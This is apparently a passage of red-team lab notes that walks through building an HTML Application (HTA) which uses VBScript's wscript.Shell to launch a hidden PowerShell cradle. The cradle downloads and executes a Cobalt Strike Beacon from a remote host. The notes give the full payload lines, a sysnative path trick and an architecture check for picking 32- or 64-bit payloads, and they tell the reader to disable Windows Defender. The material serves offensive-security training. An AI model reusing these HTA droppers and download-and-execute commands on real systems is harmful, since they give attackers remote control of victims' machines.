An HTA is a proprietary Windows program whose source code consists of HTML and one or more scripting languages supported by Internet Explorer (VBScript and JScript). The HTML is used to generate the user interface and the scripting language for the program logic. An HTA executes without the constraints of the browser's security model, so it executes as a "fully trusted" application.

An HTA is executed using `mshta.exe`, which is typically installed along with IE. In fact, `mshta` is dependant on IE, so if it has been uninstalled, HTAs will be unable to execute.

To create an HTA, open **Visual Studio Code** on the **attacker-windows** VM and create a new empty file. Save the following content to **C:\\Payloads\\demo.hta**.

```html
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>
</html>
```

Now browse to this file in explorer and double-click it to run (make sure to select Microsoft HTML Application host if prompted). All being well, a window will appear with the rendered content.

Being HTML you can put anything that you want the user to see - so channel your inner creativity.

Let's add some **VBScript** that will execute something on the user's machine. Launching **calc** is the most 1337 thing you can do, so let's try that.
```html
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

The `wscript.Shell` object provides access to the Windows shell methods and the `run` method simply allows us to run an application from disk. Run the HTA again and the calculator should appear on the desktop.

Next, we need to replace calc with a Beacon payload. Let's use a PowerShell payload.

In Cobalt Strike, go to **Attacks > Web Drive-by > Scripted Web Delivery (S)** and generate a 64-bit PowerShell payload for your HTTP listener. The URI path can be anything, but I will keep it as **/a**.

This will generate a PowerShell payload and host it on the Team Server so that it can be downloaded over HTTP and executed in-memory. Cobalt Strike will also generate the PowerShell one-liner that will do just that.

![[Pasted image 20220831113736.png]]

Copy/paste this line into the HTA in place of calc and make sure to add another set of double quotation marks around the IEX command. It should look like this:

```shell
shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"""
```

Before you execute the HTA, go to **View > Web Log** in Cobalt Strike. This allows us to see incoming HTTP requests. Now run the HTA.

```
You will need to disable Windows Defender on the attacker-windows VM first.
```

You should see an entry appear in the weblog for `/a` (or whatever URI you used), but no Beacon will appear. Why is that?  If we use Process Hacker to inspect the running `mshta` process, we can see it's actually a 32-bit application (there is a 64-bit version, but the 32-bit version is the one that seems to run by default).

![[Pasted image 20220831113809.png]]

This means that mshta is also launching the 32-bit version of PowerShell, but the payload we generated was 64-bit.  We can "fix" this by either changing our payload to be 32-bit (not desirable), or to force mshta to use the 64-bit version of PowerShell.

To do the latter, instead of simply putting `powershell.exe` into the HTA, we provide the full path:
```shell
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

`sysnative` is a sort of alias for `System32` that only exists for 32-bit applications running on a 64-bit OS. Otherwise if you try to access `C:\Windows\System32` in a 32-bit application, it will actually redirect to `C:\Windows\SysWOW64`.  I recommend checking out [this article](https://www.samlogic.net/articles/32-64-bit-windows-folder-x86-syswow64.htm) to understand SysWOW64 better.

A more robust solution could be to perform an architecture check in the HTA or an intermediately PowerShell script and invoke the correct payload for the target.

```vb.net
Function Pwn()
  Set shell = CreateObject("wscript.Shell")

  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/a'))"""
  Else
    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/b'))"""
  End If

End Function
```

> Fix the HTA using the details above to get a 64-bit Beacon running on **attacker-windows**.
